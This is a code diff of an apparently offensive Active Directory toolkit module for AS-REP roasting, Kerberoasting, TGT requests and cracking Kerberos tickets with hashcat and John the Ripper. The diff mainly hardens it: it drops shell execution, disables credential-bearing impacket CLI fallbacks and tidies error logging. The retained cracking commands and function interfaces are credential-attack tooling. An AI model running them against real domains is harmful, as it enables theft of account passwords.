@@ -12,11 +12,12 @@ Usage::
     hashes = kerberoast("10.10.10.100", creds={"user": "svc", "password": "P@ss", "domain": "CORP"})
 """
 
+from __future__ import annotations
+
 import logging
 import os
 import shutil
 import subprocess
-from typing import Optional
 
 # ── Logging ──────────────────────────────────────────────────────────────
 logger = logging.getLogger("octopus.killchain.ad.kerberos")
@@ -41,7 +42,7 @@ CLI_TIMEOUT = 300
 
 # Internal helpers
 
-def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
+def _normalize_creds(creds: dict[str, str] | None) -> dict[str, str]:
     """Return a dict with guaranteed keys: user, password, domain, nthash."""
     defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
     if creds:
@@ -56,29 +57,31 @@ def _loot_dir(target: str) -> str:
     return path
 
 
-def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
-    """Execute a shell command and return combined stdout+stderr."""
+def _run_cli(cmd: list[str] | tuple[str, ...], timeout: int = CLI_TIMEOUT) -> str:
+    """Execute an explicit argv vector without a shell."""
+    if isinstance(cmd, (str, bytes)) or not cmd:
+        return "[!] Unsafe CLI command rejected: an argv sequence is required"
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
+            list(cmd), shell=False, capture_output=True, text=True, timeout=timeout,
         )
         return (result.stdout + result.stderr).strip()
     except subprocess.TimeoutExpired:
-        logger.warning("CLI command timed out: %s", cmd[:80])
+        logger.warning("CLI command timed out: %s", cmd[0])
         return f"[!] Command timed out after {timeout}s"
     except FileNotFoundError:
         return "[!] Command not found"
     except Exception as exc:
-        logger.error("CLI command failed: %s", exc)
-        return f"[!] Command error: {exc}"
+        logger.error("CLI command failed (%s)", type(exc).__name__)
+        return f"[!] Command error: {type(exc).__name__}"
 
 
 # AS-REP Roasting
 
 def asrep_roast(
     target: str,
-    userlist: Optional[list[str]] = None,
-    creds: Optional[dict[str, str]] = None,
+    userlist: list[str] | None = None,
+    creds: dict[str, str] | None = None,
 ) -> str:
     """Perform AS-REP Roasting to find accounts with Kerberos pre-auth disabled.
 
@@ -159,24 +162,7 @@ def asrep_roast(
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
     if cli_bin:
-        user_arg = ""
-        if userlist:
-            userlist_path = os.path.join(loot, "asrep_users.txt")
-            with open(userlist_path, "w") as fh:
-                fh.write("\n".join(userlist))
-            user_arg = f"-usersfile {userlist_path}"
-
-        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
-        cmd = (
-            f'{cli_bin} "{auth}" -dc-ip {target} -request '
-            f'-format hashcat -outputfile {hash_file} {user_arg}'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:2000]}\n"
-
-        if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
-            with open(hash_file) as fh:
-                output += f"\n{fh.read()[:2000]}\n"
+        output += "[!] Credential-bearing GetNPUsers CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket GetNPUsers available. Install impacket.\n"
 
@@ -185,7 +171,7 @@ def asrep_roast(
 
 # Kerberoasting
 
-def kerberoast(target: str, creds: Optional[dict[str, str]] = None) -> str:
+def kerberoast(target: str, creds: dict[str, str] | None = None) -> str:
     """Kerberoast — request TGS tickets for service accounts and crack offline.
 
     Tries impacket's ``GetUserSPNs`` first, then the CLI.
@@ -247,17 +233,7 @@ def kerberoast(target: str, creds: Optional[dict[str, str]] = None) -> str:
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
     if cli_bin:
-        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
-        cmd = (
-            f'{cli_bin} "{auth}" -dc-ip {target} '
-            f'-request -outputfile {hash_file}'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:2000]}\n"
-
-        if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
-            with open(hash_file) as fh:
-                output += f"\n{fh.read()[:2000]}\n"
+        output += "[!] Credential-bearing GetUserSPNs CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket GetUserSPNs available. Install impacket.\n"
 
@@ -266,7 +242,7 @@ def kerberoast(target: str, creds: Optional[dict[str, str]] = None) -> str:
 
 # Ticket extraction
 
-def extract_tickets(target: str, creds: Optional[dict[str, str]] = None) -> str:
+def extract_tickets(target: str, creds: dict[str, str] | None = None) -> str:
     """Extract TGT/TGS tickets from memory or request new ones via impacket.
 
     Uses ``getTGT`` from impacket to request a TGT for the supplied
@@ -334,16 +310,7 @@ def extract_tickets(target: str, creds: Optional[dict[str, str]] = None) -> str:
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("getTGT.py") or shutil.which("impacket-getTGT")
     if cli_bin:
-        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
-        cmd = f'{cli_bin} "{auth}" -dc-ip {target}'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:2000]}\n"
-
-        # impacket writes .ccache in CWD — move to loot
-        default_ccache = f"{creds['user']}.ccache"
-        if os.path.isfile(default_ccache):
-            shutil.move(default_ccache, ccache_file)
-            output += f"[+] TGT saved → {ccache_file}\n"
+        output += "[!] Credential-bearing getTGT CLI fallback is disabled.\n"
     else:
         output += "[!] No impacket getTGT available. Install impacket.\n"
 
@@ -398,15 +365,18 @@ def crack_tickets(
     if shutil.which("hashcat"):
         print(f"    {C_CYAN}[*] Cracking with hashcat (mode {hashcat_mode})...{C_RESET}")
         potfile = ticket_file + ".potfile"
-        cmd = (
-            f"hashcat -m {hashcat_mode} {ticket_file} {wordlist} "
-            f"--potfile-path {potfile} --force --quiet"
-        )
+        cmd = [
+            "hashcat", "-m", str(hashcat_mode), ticket_file, wordlist,
+            "--potfile-path", potfile, "--force", "--quiet",
+        ]
         cli_out = _run_cli(cmd, timeout=CLI_TIMEOUT)
         output += f"[hashcat]\n{cli_out[:3000]}\n"
 
         # Show cracked results
-        show_cmd = f"hashcat -m {hashcat_mode} {ticket_file} --show --potfile-path {potfile} --quiet"
+        show_cmd = [
+            "hashcat", "-m", str(hashcat_mode), ticket_file,
+            "--show", "--potfile-path", potfile, "--quiet",
+        ]
         cracked = _run_cli(show_cmd, timeout=30)
         if cracked and "[!]" not in cracked:
             output += f"\n[+] CRACKED HASHES:\n{cracked[:2000]}\n"
@@ -417,13 +387,13 @@ def crack_tickets(
     john_bin = shutil.which("john") or shutil.which("john-the-ripper")
     if john_bin:
         print(f"    {C_CYAN}[*] Cracking with John the Ripper...{C_RESET}")
-        cmd = f"{john_bin} {ticket_file} --wordlist={wordlist} --format=krb5tgs"
+        cmd = [john_bin, ticket_file, f"--wordlist={wordlist}", "--format=krb5tgs"]
         if mode == "asrep":
-            cmd = f"{john_bin} {ticket_file} --wordlist={wordlist} --format=krb5asrep"
+            cmd = [john_bin, ticket_file, f"--wordlist={wordlist}", "--format=krb5asrep"]
         cli_out = _run_cli(cmd, timeout=CLI_TIMEOUT)
         output += f"[john]\n{cli_out[:3000]}\n"
 
-        show_cmd = f"{john_bin} {ticket_file} --show"
+        show_cmd = [john_bin, ticket_file, "--show"]
         cracked = _run_cli(show_cmd, timeout=30)
         if cracked and "[!]" not in cracked:
             output += f"\n[+] CRACKED:\n{cracked[:2000]}\n"
